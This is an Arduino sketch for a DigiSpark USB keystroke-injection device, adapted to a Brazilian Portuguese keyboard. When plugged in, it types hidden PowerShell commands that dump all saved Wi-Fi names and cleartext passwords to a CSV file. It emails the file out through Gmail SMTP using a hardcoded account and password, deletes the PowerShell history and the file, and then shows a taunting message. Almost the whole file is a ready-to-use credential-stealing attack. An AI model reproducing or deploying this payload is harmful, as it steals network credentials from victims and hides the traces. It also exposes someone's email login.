//This DigiSpark script writes the wireless network credentials to a csv file and emails it.
//Credits to p0wc0w.
//Updated by gadotti:
//  Uses a pt-bt layout keyboard
//  Change to search for portuguese brazilian windows terms
#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
  digitalWrite(1, HIGH); // LED on <--> Action start
  
  //DigiKeyboardPtBr.sendKeyStroke(0);
  //DigiKeyboardPtBr.delay(500);
  //DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //DigiKeyboardPtBr.delay(500);
  //DigiKeyboardPtBr.print("https://fakeupdate.net/win10ue/");
  //DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  //DigiKeyboardPtBr.delay(2000);
  //DigiKeyboardPtBr.sendKeyStroke(KEY_F11);
  
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print("COLOR EF");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  //Original: DigiKeyboardPtBr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv\""));
  DigiKeyboardPtBr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '~:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String 'do da Chave~W+~:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv\" "));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(3000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print("COLOR EF");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('kriarinformatica@gmail.com', 'Summonn666!'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'kriarinformatica@gmail.com'; $ReportEmail.To.Add('kriarinformatica@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'You did it boi!'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print("COLOR EF");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"del (Get-PSReadlineOption).HistorySavePath\""));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print("COLOR EF");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print(F("del temp.csv"));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print(F("exit"));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://y2u.be/dQw4w9WgXcQ");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);
  DigiKeyboard.print("Mano, meu mano. voce foi infectado mano.");
  
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }
}
